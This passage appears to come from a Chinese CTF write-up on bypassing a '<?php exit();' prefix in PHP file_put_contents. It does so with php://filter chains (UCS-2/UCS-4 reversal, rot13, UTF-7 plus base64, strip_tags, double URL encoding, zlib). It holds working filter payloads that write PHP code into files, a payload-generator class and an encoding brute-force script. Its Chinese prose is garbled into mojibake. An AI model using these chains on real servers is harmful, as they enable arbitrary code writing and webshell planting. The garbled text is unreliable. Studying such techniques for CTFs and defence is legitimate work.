<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO (alias: UTF-<span class="hljs-number">8</span>-DOCOMO)
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B (alias: UTF-<span class="hljs-number">8</span>-KDDI)
<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK (alias: UTF-<span class="hljs-number">8</span>-SOFTBANK)
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI (alias: ISO-<span class="hljs-number">2022</span>-JP-KDDI)
<span class="hljs-attribute">JIS</span>
<span class="hljs-attribute">JIS</span>-ms
<span class="hljs-attribute">CP50220</span>
<span class="hljs-attribute">CP50220raw</span>
<span class="hljs-attribute">CP50221</span>
<span class="hljs-attribute">CP50222</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>
<span class="hljs-attribute">byte2be</span>
<span class="hljs-attribute">byte2le</span>
<span class="hljs-attribute">byte4be</span>
<span class="hljs-attribute">byte4le</span>
<span class="hljs-attribute">BASE64</span>
<span class="hljs-attribute">HTML</span>-ENTITIES (alias: HTML)
<span class="hljs-attribute">7bit</span>
<span class="hljs-attribute">8bit</span>
<span class="hljs-attribute">EUC</span>-CN
<span class="hljs-attribute">CP936</span>
<span class="hljs-attribute">GB18030</span>
<span class="hljs-attribute">HZ</span>
<span class="hljs-attribute">EUC</span>-TW
<span class="hljs-attribute">CP950</span>
<span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>
<span class="hljs-attribute">EUC</span>-KR
<span class="hljs-attribute">UHC</span> (alias: CP<span class="hljs-number">949</span>)
<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR
<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span> (alias: CP<span class="hljs-number">1251</span>)
<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span> (alias: CP<span class="hljs-number">1252</span>)
<span class="hljs-attribute">CP866</span> (alias: IBM<span class="hljs-number">866</span>)
<span class="hljs-attribute">KOI8</span>-R
<span class="hljs-attribute">KOI8</span>-U
<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span> (alias: ArmSCII<span class="hljs-number">8</span>)</code></pre></div>



<p><strong>é€šè¿‡UCS-2æˆ–è€…UCS-4çš„æ–¹å¼ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ2/4ä½ä¸€åè½¬ï¼Œä¹Ÿå°±æ˜¯è¯´æ„é€ çš„éœ€è¦æ˜¯UCS-2æˆ–UCS-4ä¸­2æˆ–è€…4çš„å€æ•°ï¼Œä¸ç„¶ä¸èƒ½è¿›è¡Œåè½¬</strong></p>
<p>æ„é€ payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UCS-4LE&quot;</span>,<span class="hljs-string">&quot;UCS-4BE&quot;</span>,<span class="hljs-string">&#x27;aa&lt;?php phpinfo();?&gt;&#x27;</span>);
?&lt;aa phpiphp(ofn&gt;?;)</code></pre></div>





<p>payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php&#x27;</span>;

<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php&#x27;</span>;
<span class="hljs-comment">#ç”±äºæ˜¯4ä½ä¸€åè½¬ï¼Œæ‰€ä»¥éœ€è¦ä¿è¯?&lt;aa phpiphp(ofn&gt;?;)ä¹‹å‰å­—ç¬¦ä¸ªæ•°æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥éœ€è¦è¡¥3ä¸ªå­—ç¬¦</span></code></pre></div>









<h3 id="4-UCS-2ç»„åˆrot13"><a href="#4-UCS-2ç»„åˆrot13" class="headerlink" title="4. UCS-2ç»„åˆrot13"></a>4. UCS-2ç»„åˆrot13</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=drom.php&#x27;</span>; <span class="hljs-comment">#åŒæ ·éœ€è¦è¡¥ä½ï¼Œè¿™é‡Œè¡¥äº†ä¸€ä¸ªx</span></code></pre></div>



<p>åŸºç¡€pocï¼š</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [
        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,
        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,
        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,
        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [
        <span class="hljs-string">&#x27;deflate&#x27;</span>,
        <span class="hljs-string">&#x27;inflate&#x27;</span>
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [
        <span class="hljs-string">&#x27;compress&#x27;</span>,
        <span class="hljs-string">&#x27;decompress&#x27;</span>
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [
        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,
        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,
        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,
        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,
        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,
        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,
        <span class="hljs-string">&#x27;ASCII&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS&#x27;</span>,
        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
        <span class="hljs-string">&#x27;CP932&#x27;</span>,
        <span class="hljs-string">&#x27;CP51932&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,
        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
        <span class="hljs-string">&#x27;JIS&#x27;</span>,
        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
        <span class="hljs-string">&#x27;CP50220&#x27;</span>,
        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
        <span class="hljs-string">&#x27;CP50221&#x27;</span>,
        <span class="hljs-string">&#x27;CP50222&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
        <span class="hljs-string">&#x27;byte2be&#x27;</span>,
        <span class="hljs-string">&#x27;byte2le&#x27;</span>,
        <span class="hljs-string">&#x27;byte4be&#x27;</span>,
        <span class="hljs-string">&#x27;byte4le&#x27;</span>,
        <span class="hljs-string">&#x27;BASE64&#x27;</span>,
        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
        <span class="hljs-string">&#x27;7bit&#x27;</span>,
        <span class="hljs-string">&#x27;8bit&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
        <span class="hljs-string">&#x27;CP936&#x27;</span>,
        <span class="hljs-string">&#x27;GB18030&#x27;</span>,
        <span class="hljs-string">&#x27;HZ&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
        <span class="hljs-string">&#x27;CP950&#x27;</span>,
        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
        <span class="hljs-string">&#x27;UHC&#x27;</span>,
        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
        <span class="hljs-string">&#x27;CP866&#x27;</span>,
        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [
        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [
            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>
        ],

        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>
    ];

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;
        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);
    &#125;


    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;
        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;

        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;
                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);
                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);
            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;
                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);
                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);

            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;
                ;
            &#125;
        &#125;

        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;

        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;
        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;

        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:
                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;
                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;
                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:
                ;
        &#125;
        
        <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;
        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;
        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;
    &#125;
&#125;


<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();
<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div>



<h3 id="5-utf8ç¼–ç è½¬ä¸ºutf7é…åˆbase64"><a href="#5-utf8ç¼–ç è½¬ä¸ºutf7é…åˆbase64" class="headerlink" title="5. utf8ç¼–ç è½¬ä¸ºutf7é…åˆbase64"></a>5. utf8ç¼–ç è½¬ä¸ºutf7é…åˆbase64</h3><p>å‰é¢ä»‹ç»å•ç‹¬ç”¨base64ç¼–ç æ˜¯ä¸å¯è¡Œçš„ï¼Œé‚£ä¹ˆæ¥ä¸€å¥—ç»„åˆæ‹³æ˜¯å¦å¯ä»¥å‘¢ï¼Ÿç­”æ¡ˆè‚¯å®šæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œæ„Ÿè°¢å¤§å…„å¼Ÿ<a target="_blank" rel="noopener" href="http://yulige.top/">éƒç¦»æ­Œ</a>æä¾›çš„æ–¹æ³•ï¼Œé€šè¿‡iconvå°†utf8ç¼–ç è½¬ä¸ºutf7ç¼–ç ï¼Œä»è€ŒæŠŠ <strong>=</strong> ç»™è½¬äº†ï¼Œå°±ä¸ä¼šå½±å“åˆ°base64çš„è§£ç äº†</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php&#x27;</span>; <span class="hljs-comment">#base64ç¼–ç å‰è¡¥äº†AAï¼ŒåŸç†ä¸€æ ·ï¼Œè¡¥é½ä½æ•°</span></code></pre></div>



<h3 id="6-strip-tagsé…åˆbase64"><a href="#6-strip-tagsé…åˆbase64" class="headerlink" title="6. strip_tagsé…åˆbase64"></a>6. strip_tagsé…åˆbase64</h3><p>æˆ‘ä»¬æ¥ç”¨ä¸€ä¸‹strip_tagsæ–¹æ³•&amp;&amp;base64çš„ç»„åˆï¼Œä¸è¿‡ä¹‹å‰æ„é€ çš„è¿™ç§æ–¹æ³•æœ‰å±€é™æ€§ï¼Œè¦æ±‚æœåŠ¡å™¨æ˜¯linuxç³»ç»Ÿï¼Œæ‰€ä»¥ä¹‹å‰æ²¡å†™ã€‚å› ä¸ºå‰é¢ä»‹ç»è¿‡strip_tagså»é™¤çš„æ˜¯å®Œæ•´çš„æ ‡ç­¾ä»¥åŠå†…å®¹ï¼Œè€Œbase64è¦æ±‚ä¸­é—´ä¸èƒ½å‡ºç° <code>=</code> æ‰€ä»¥æŠŠä»–ä»¬äºŒè€…ç»„åˆèµ·æ¥</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>;</code></pre></div>



<p>ç†è§£èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨æ–‡ä»¶åå‰åŠ ä¸Š<code>?&gt;</code>æŠŠ<code>&lt;?php exit();</code>é—­åˆï¼ŒåŒæ—¶ = ä¹Ÿåœ¨é—­åˆæ ‡ç­¾ä¹‹é—´ï¼Œæ‰€ä»¥åˆ©ç”¨strip_tagså¤„ç†çš„æ—¶å€™ç›´æ¥æŠŠ<code>&lt;?php ...... ?&gt;</code>å†…çš„æ‰€æœ‰å†…å®¹éƒ½åˆ é™¤äº†ï¼Œç„¶åå¯¹å‰©ä¸‹çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>è¿›è¡Œbase64è§£ç ï¼Œä¸ºä»€ä¹ˆè¯´è¿™ç§æ„é€ Windowsä¸è¡Œå‘¢ï¼Œå› ä¸ºWindowsä¸æ”¯æŒæ–‡ä»¶åä¸­æœ‰<code>?</code>ã€<code>&gt;</code>è¿™ç±»å­—ç¬¦</p>
<h3 id="7-äºŒæ¬¡ç¼–ç ç‰¹æ€§é…åˆè¿‡æ»¤å™¨"><a href="#7-äºŒæ¬¡ç¼–ç ç‰¹æ€§é…åˆè¿‡æ»¤å™¨" class="headerlink" title="7. äºŒæ¬¡ç¼–ç ç‰¹æ€§é…åˆè¿‡æ»¤å™¨"></a><strong>7. äºŒæ¬¡ç¼–ç ç‰¹æ€§é…åˆè¿‡æ»¤å™¨</strong></h3><p>æŸ¥çœ‹ä¼ªåè®®å¤„ç†çš„æºç </p>
<div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">php_stream_apply_filter_list</span><span class="hljs-params">(php_stream *stream, <span class="hljs-keyword">char</span> *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain)</span> <span class="hljs-comment">/* &#123;&#123;&#123; */</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">char</span> *p, *token = <span class="hljs-literal">NULL</span>;
	php_stream_filter *temp_filter;

	p = php_strtok_r(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);
	<span class="hljs-keyword">while</span> (p) &#123;
		php_url_decode(p, <span class="hljs-built_in">strlen</span>(p));#ğŸ‘ˆå¯¹è¿‡æ»¤å™¨è¿›è¡Œäº†ä¸€æ¬¡urldecode
		<span class="hljs-keyword">if</span> (read_chain) &#123;
			<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;
				php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);
			&#125; <span class="hljs-keyword">else</span> &#123;
				php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);
			&#125;
		&#125;
		<span class="hljs-keyword">if</span> (write_chain) &#123;
			<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;
				php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);
			&#125; <span class="hljs-keyword">else</span> &#123;
				php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);
			&#125;
		&#125;
		p = php_strtok_r(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);
	&#125;
&#125;</code></pre></div>

<p>file_put_contentsä¸­å¯ä»¥è°ƒç”¨ä¼ªåè®®ï¼Œè€Œ<strong>ä¼ªåè®®å¤„ç†æ—¶ä¼šå¯¹è¿‡æ»¤å™¨urldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡çš„</strong>ï¼Œä¸è¿‡æˆ‘ä»¬åœ¨æœåŠ¡ç«¯banäº†%25ï¼ˆç”¨%25å¤ªç®€å•äº†ï¼‰æ‰€ä»¥æµ‹è¯•%25è¢«banåå°±å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å­—ç¬¦ï¼Œæ„é€ ä¸€äº›è¿‡æ»¤çš„å­—ç¬¦å°±å¯ä»¥åˆ©ç”¨æ­£å¸¸çš„å§¿åŠ¿ç»•è¿‡ã€‚çŸ¥é“å¯ä»¥ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡äº†ï¼Œå¯ä»¥ç®€å•æ„é€ ä¸€ä¸‹å‚è§çš„payloadå³å¯ï¼Œå¯å‚è€ƒæˆ‘ä¹‹å‰å†™çš„æ–‡ç« ä¸­çš„ä¸€äº›payload</p>
<p>urläºŒæ¬¡ç¼–ç è„šæœ¬</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$char</span> = <span class="hljs-string">&#x27;r&#x27;</span>; <span class="hljs-comment">#æ„é€ rçš„äºŒæ¬¡ç¼–ç </span>
<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii1</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii1</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii1</span>++) &#123;
	<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii2</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii2</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii2</span>++) &#123;
		<span class="hljs-variable">$aaa</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii1</span>.<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii2</span>;
		<span class="hljs-keyword">if</span>(urldecode(urldecode(<span class="hljs-variable">$aaa</span>)) == <span class="hljs-variable">$char</span>)&#123;
			<span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$aaa</span>;
			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
		&#125;
	&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>ä½¿ç”¨burpä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906195755600.png" alt="image-20200906195755600"></p>
<h3 id="8-zlib-deflateä¸zlib-inflateç»“åˆå…¶ä»–è¿‡æ»¤å™¨"><a href="#8-zlib-deflateä¸zlib-inflateç»“åˆå…¶ä»–è¿‡æ»¤å™¨" class="headerlink" title="8. zlib.deflateä¸zlib.inflateç»“åˆå…¶ä»–è¿‡æ»¤å™¨"></a>8. zlib.deflateä¸zlib.inflateç»“åˆå…¶ä»–è¿‡æ»¤å™¨</h3><ul>
<li>zlib.deflateä¸zlib.inflateç»“åˆä¹‹åå†…å®¹è‚¯å®šä¸å˜ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å…¶ä¸­åŠ å…¥åˆ«çš„è¿‡æ»¤å™¨ï¼Œå³å¯</li>
<li>åœ¨wmctfä¸­ï¼Œzlib.deflateä¸zlib.inflateä¸­é—´åŠ å…¥string.tolowerè¿‡æ»¤å™¨ä¼šä½¿&lt;?php exit(); å˜æˆ&lt;?php@ï¿½xit()æ— æ³•è§£æã€‚</li>
</ul>
